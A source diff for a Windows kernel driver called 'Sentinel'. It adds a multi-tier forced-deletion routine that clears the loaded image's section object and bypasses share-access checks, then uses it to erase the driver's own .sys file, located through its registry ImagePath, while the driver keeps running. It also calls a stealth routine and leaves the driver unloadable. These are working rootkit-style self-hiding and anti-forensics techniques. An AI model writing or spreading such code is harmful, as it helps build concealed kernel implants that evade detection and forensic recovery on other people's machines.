@@ -14,9 +14,27 @@ volatile ULONG  g_target_driver_size   = 0;
 #pragma comment(linker, "/SECTION:.sntl,RW")
 
 
+#ifndef FILE_DISPOSITION_FLAG_DELETE
+#define FILE_DISPOSITION_FLAG_DELETE                 0x00000001
+#endif
+#ifndef FILE_DISPOSITION_FLAG_POSIX_SEMANTICS
+#define FILE_DISPOSITION_FLAG_POSIX_SEMANTICS       0x00000002
+#endif
+#ifndef FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE
+#define FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE 0x00000010
+#endif
+
+static constexpr FILE_INFORMATION_CLASS FileDispositionInformationExClass =
+    static_cast<FILE_INFORMATION_CLASS>(64);
+
+constexpr ULONG TAG_DEL = 'leDW';
+
+
 static PDRIVER_OBJECT g_sentinel_driver_object = nullptr;
 static volatile LONG  g_shutdown_flag = 0;
 static HANDLE         g_init_thread_handle = nullptr;
+static WCHAR          g_registry_path_buffer[512] = {};
+static UNICODE_STRING g_registry_path = {};
 
 
 static bool find_text_section(PVOID image_base, PVOID* out_base, ULONG* out_size) {
@@ -67,6 +85,205 @@ static PDRIVER_OBJECT find_target_driver_object(PVOID target_base) {
 
 
     return nullptr;
+}
+
+
+static BOOLEAN ForceDeleteFileByPath(PUNICODE_STRING FilePath) {
+    if (!FilePath || !FilePath->Buffer || !_ZwSetInformationFile)
+        return FALSE;
+
+    OBJECT_ATTRIBUTES objAttr;
+    InitializeObjectAttributes(&objAttr, FilePath,
+        OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    // Pre-step: clear ImageSectionObject so the file can be deleted
+    {
+        HANDLE clearHandle = NULL;
+        IO_STATUS_BLOCK clearIosb = {};
+        NTSTATUS clearStatus = ZwCreateFile(
+            &clearHandle,
+            FILE_READ_ATTRIBUTES | SYNCHRONIZE,
+            &objAttr,
+            &clearIosb,
+            NULL,
+            FILE_ATTRIBUTE_NORMAL,
+            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+            FILE_OPEN,
+            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
+            NULL, 0);
+
+        if (NT_SUCCESS(clearStatus) && clearHandle) {
+            PFILE_OBJECT fileObj = NULL;
+            clearStatus = ObReferenceObjectByHandle(
+                clearHandle, 0, *IoFileObjectType, KernelMode,
+                reinterpret_cast<PVOID*>(&fileObj), NULL);
+
+            if (NT_SUCCESS(clearStatus) && fileObj) {
+                PSECTION_OBJECT_POINTERS sop = fileObj->SectionObjectPointer;
+                if (sop)
+                    sop->ImageSectionObject = NULL;
+                ObDereferenceObject(fileObj);
+            }
+            _ZwClose(clearHandle);
+        }
+    }
+
+    // Tier 0: POSIX unlink via IoCreateFileEx + FileDispositionInformationEx
+    if (_IoCreateFileEx) {
+        HANDLE fileHandle = NULL;
+        IO_STATUS_BLOCK ioStatus = {};
+        IO_DRIVER_CREATE_CONTEXT createCtx = {};
+        createCtx.Size = sizeof(createCtx);
+
+        NTSTATUS status = _IoCreateFileEx(
+            &fileHandle,
+            DELETE | SYNCHRONIZE | FILE_WRITE_ATTRIBUTES,
+            &objAttr, &ioStatus, NULL,
+            FILE_ATTRIBUTE_NORMAL,
+            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+            FILE_OPEN,
+            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
+            NULL, 0, CreateFileTypeNone, NULL,
+            IO_IGNORE_SHARE_ACCESS_CHECK, &createCtx);
+
+        if (NT_SUCCESS(status)) {
+            struct { ULONG Flags; } dispEx = {};
+            dispEx.Flags = FILE_DISPOSITION_FLAG_DELETE
+                         | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS
+                         | FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE;
+
+            status = _ZwSetInformationFile(
+                fileHandle, &ioStatus,
+                &dispEx, sizeof(dispEx),
+                FileDispositionInformationExClass);
+            _ZwClose(fileHandle);
+
+            if (NT_SUCCESS(status))
+                return TRUE;
+        }
+    }
+
+    // Tier 1: ZwDeleteFile
+    if (_ZwDeleteFile) {
+        if (NT_SUCCESS(_ZwDeleteFile(&objAttr)))
+            return TRUE;
+    }
+
+    // Tier 2: DELETE_ON_CLOSE via IoCreateFileEx
+    if (_IoCreateFileEx) {
+        HANDLE fileHandle = NULL;
+        IO_STATUS_BLOCK ioStatus = {};
+        IO_DRIVER_CREATE_CONTEXT createCtx = {};
+        createCtx.Size = sizeof(createCtx);
+
+        NTSTATUS status = _IoCreateFileEx(
+            &fileHandle,
+            DELETE | SYNCHRONIZE,
+            &objAttr, &ioStatus, NULL,
+            FILE_ATTRIBUTE_NORMAL,
+            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+            FILE_OPEN,
+            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE,
+            NULL, 0, CreateFileTypeNone, NULL,
+            IO_IGNORE_SHARE_ACCESS_CHECK, &createCtx);
+
+        if (NT_SUCCESS(status)) {
+            _ZwClose(fileHandle);
+            return TRUE;
+        }
+    }
+
+    // Tier 3: standard FileDispositionInformation
+    {
+        HANDLE fileHandle = NULL;
+        IO_STATUS_BLOCK ioStatus = {};
+        NTSTATUS status = ZwCreateFile(
+            &fileHandle,
+            DELETE | SYNCHRONIZE,
+            &objAttr, &ioStatus, NULL,
+            FILE_ATTRIBUTE_NORMAL,
+            FILE_SHARE_DELETE,
+            FILE_OPEN,
+            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
+            NULL, 0);
+
+        if (!NT_SUCCESS(status))
+            return FALSE;
+
+        struct { BOOLEAN DeleteFile; } dispInfo = { TRUE };
+        status = _ZwSetInformationFile(
+            fileHandle, &ioStatus,
+            &dispInfo, sizeof(dispInfo),
+            static_cast<FILE_INFORMATION_CLASS>(13));
+        _ZwClose(fileHandle);
+        return NT_SUCCESS(status);
+    }
+}
+
+
+static VOID DeleteDriverOnDisk(PUNICODE_STRING RegistryPath) {
+    if (!RegistryPath || !RegistryPath->Buffer)
+        return;
+    if (!_ZwOpenKey || !_ZwQueryValueKey || !_ZwClose)
+        return;
+
+    OBJECT_ATTRIBUTES keyAttr;
+    InitializeObjectAttributes(&keyAttr, RegistryPath,
+        OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    HANDLE keyHandle = NULL;
+    NTSTATUS status = _ZwOpenKey(&keyHandle, KEY_READ, &keyAttr);
+    if (!NT_SUCCESS(status))
+        return;
+
+    UNICODE_STRING valueName;
+    _RtlInitUnicodeString(&valueName, L"ImagePath");
+
+    ULONG kvSize = 0;
+    status = _ZwQueryValueKey(keyHandle, &valueName,
+        KeyValuePartialInformation, NULL, 0, &kvSize);
+    if (status != STATUS_BUFFER_TOO_SMALL && status != STATUS_BUFFER_OVERFLOW) {
+        _ZwClose(keyHandle);
+        return;
+    }
+
+#pragma warning(push)
+#pragma warning(disable: 4996)
+    auto kvInfo = static_cast<PKEY_VALUE_PARTIAL_INFORMATION>(
+        ExAllocatePoolWithTag(NonPagedPool, kvSize, TAG_DEL));
+#pragma warning(pop)
+
+    if (!kvInfo) {
+        _ZwClose(keyHandle);
+        return;
+    }
+
+    status = _ZwQueryValueKey(keyHandle, &valueName,
+        KeyValuePartialInformation, kvInfo, kvSize, &kvSize);
+    _ZwClose(keyHandle);
+
+    if (!NT_SUCCESS(status) ||
+        (kvInfo->Type != REG_SZ && kvInfo->Type != REG_EXPAND_SZ)) {
+        ExFreePoolWithTag(kvInfo, TAG_DEL);
+        return;
+    }
+
+    ULONG dataLen = kvInfo->DataLength;
+    if (dataLen >= sizeof(WCHAR)) {
+        PWCHAR imgBuf = reinterpret_cast<PWCHAR>(kvInfo->Data);
+        ULONG chars = dataLen / sizeof(WCHAR);
+        if (imgBuf[chars - 1] == L'\0')
+            chars--;
+
+        UNICODE_STRING imagePath;
+        imagePath.Buffer = imgBuf;
+        imagePath.Length = static_cast<USHORT>(chars * sizeof(WCHAR));
+        imagePath.MaximumLength = static_cast<USHORT>(dataLen);
+
+        ForceDeleteFileByPath(&imagePath);
+    }
+
+    ExFreePoolWithTag(kvInfo, TAG_DEL);
 }
 
 
@@ -162,6 +379,16 @@ static void NTAPI init_thread_routine(PVOID ) {
         thread_guard::ipi_clear_all_cpus();
 
 
+        // Apply stealth now — runs in system thread at PASSIVE_LEVEL,
+        // after DriverEntry has returned and IopLoadDriver released its locks
+        self_protect::apply_stealth(g_sentinel_driver_object);
+
+
+        // Delete the Sentinel driver .sys from disk
+        if (g_registry_path.Buffer && g_registry_path.Length > 0)
+            DeleteDriverOnDisk(&g_registry_path);
+
+
         guardian::start();
     }
 
@@ -170,13 +397,29 @@ exit_thread:
 }
 
 
-NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING ) {
+NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
 
 
     if (!SetupFunctions())
         return STATUS_UNSUCCESSFUL;
 
     g_sentinel_driver_object = DriverObject;
+
+
+    // Deep-copy RegistryPath for use in the init thread (the original buffer
+    // is only valid for the duration of DriverEntry)
+    if (RegistryPath && RegistryPath->Buffer && RegistryPath->Length > 0) {
+        USHORT copy_len = RegistryPath->Length;
+        if (copy_len > sizeof(g_registry_path_buffer) - sizeof(WCHAR))
+            copy_len = sizeof(g_registry_path_buffer) - sizeof(WCHAR);
+
+        RtlCopyMemory(g_registry_path_buffer, RegistryPath->Buffer, copy_len);
+        g_registry_path_buffer[copy_len / sizeof(WCHAR)] = L'\0';
+
+        g_registry_path.Buffer = g_registry_path_buffer;
+        g_registry_path.Length = copy_len;
+        g_registry_path.MaximumLength = sizeof(g_registry_path_buffer);
+    }
 
 
     DriverObject->DriverUnload = nullptr;
@@ -203,7 +446,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING ) {
 
 
     if (own_text && own_text_size > 0)
-        self_protect::init(DriverObject, own_text, own_text_size);
+        self_protect::init_baseline(own_text, own_text_size);
 
 
     HANDLE thread_handle = nullptr;
